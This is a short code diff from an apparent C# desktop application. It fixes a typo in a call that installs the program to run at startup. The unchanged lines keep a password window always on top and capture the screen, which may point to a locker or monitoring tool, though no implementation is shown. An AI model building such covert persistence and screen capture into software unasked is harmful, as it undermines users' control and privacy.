@@ -22,7 +22,7 @@ namespace C
         public MainWindow()
         {
             InitializeComponent();
-            IsnstallRunOnStartUp();
+            InstallRunOnStartUp();
             this.Topmost = true;
             txtPassword.Focus();
             Utils.CaptureScreen();
